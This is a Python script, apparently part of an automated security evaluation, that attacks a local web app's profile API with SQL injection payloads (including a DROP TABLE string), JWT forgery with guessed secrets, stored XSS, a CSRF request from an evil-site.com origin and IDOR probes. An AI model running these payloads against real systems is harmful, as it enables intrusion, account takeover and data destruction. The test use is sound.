import requests, jwt, json

BASE = 'http://localhost:5000'

# Setup: register + login
requests.post(f'{BASE}/api/register', json={
    'username': 'testuser', 'email': 'test@test.com', 'password': 'Test123!'})
login = requests.post(f'{BASE}/api/login', json={
    'email': 'test@test.com', 'password': 'Test123!'})
token = login.json().get('token') or login.json().get('accessToken', '')  # [rep3] app returns accessToken
hdrs = {'Authorization': token}  # [rep3] auth.js reads the RAW Authorization header (no "Bearer ")
results = []

# ATTACK 1: SQL Injection
print('=== Attack 1: SQL Injection ===')
for p in ["'; DROP TABLE users;--", "' OR '1'='1"]:
    # [rep3] send the field the app actually reads ('username'), not 'name'
    r = requests.put(f'{BASE}/api/profile', json={'username': p, 'email': 't@t.com'}, headers=hdrs)
    # [rep3] real SQLi signal = a DB *syntax* error reaching the response, NOT any 500.
    #        A parameterized app stores the payload as data and returns 200 -> "blocked".
    low = r.text.lower()
    success = any(m in low for m in ['syntax error', 'unterminated', 'syntax error at or near',
                                     'invalid input syntax', 'pg_', 'sqlstate'])
    print(f'  Payload: {p[:30]} → {"VULN CONFIRMED" if success else "blocked"}')
    if success:
        results.append({'iter': 1, 'type': 'SQLi', 'cwe': 'CWE-89', 'result': 'SUCCESS'})

# ATTACK 2: JWT Auth Bypass (tests for a hardcoded / guessable signing secret)
print('\n=== Attack 2: JWT Bypass ===')
try:
    decoded = jwt.decode(token, options={'verify_signature': False})
    print(f'  Decoded: {decoded}')
except Exception as e:
    print(f'  Could not decode token: {e}')
for secret in ['test-secret-for-poc-only', 'secret', 'jwt-secret', 'my-test-secret-key-for-poc']:
    try:
        forged = jwt.encode({'userId': 999}, secret, algorithm='HS256')  # [rep3] app reads req.user.userId
        r = requests.get(f'{BASE}/api/profile', headers={'Authorization': forged})  # [rep3] RAW header
        if r.status_code == 200:
            print(f'  Secret "{secret}": AUTH BYPASS CONFIRMED!')
            results.append({'iter': 2, 'type': 'AuthBypass', 'cwe': 'CWE-287', 'result': 'SUCCESS'})
            break
    except:
        pass

# ATTACK 3: Stored XSS (unsanitized input persisted and reflected)
print('\n=== Attack 3: XSS ===')
requests.put(f'{BASE}/api/profile',
             json={'username': '<script>alert(1)</script>', 'email': 't@t.com'}, headers=hdrs)  # [rep3] username
prof = requests.get(f'{BASE}/api/profile', headers=hdrs)
if '<script>' in prof.text or 'alert' in prof.text:
    print('  STORED XSS CONFIRMED! (raw payload persisted & reflected)')
    results.append({'iter': 3, 'type': 'XSS', 'cwe': 'CWE-79', 'result': 'SUCCESS'})

# ATTACK 4: CSRF
print('\n=== Attack 4: CSRF ===')
r = requests.put(f'{BASE}/api/profile', json={'username': 'csrf', 'email': 't@t.com'},  # [rep3] username
                 headers={**hdrs, 'Origin': 'http://evil-site.com'})
if r.status_code == 200:
    print('  NO CSRF PROTECTION!')
    results.append({'iter': 4, 'type': 'CSRF', 'cwe': 'CWE-352', 'result': 'SUCCESS'})

# ATTACK 5: IDOR
print('\n=== Attack 5: IDOR ===')
for uid in [1, 2, 3, 999]:
    r = requests.get(f'{BASE}/api/profile/{uid}', headers=hdrs)
    if r.status_code == 200:
        print(f'  User {uid}: IDOR CONFIRMED!')
        results.append({'iter': 5, 'type': 'IDOR', 'cwe': 'CWE-639', 'result': 'SUCCESS'})
        break

import os
os.makedirs('red-teaming', exist_ok=True)
with open('red-teaming/attacks_a07_zs_rep3.json', 'w') as f:
    json.dump(results, f, indent=2)
print(f'\nTotal successful attacks: {len(results)}/5')
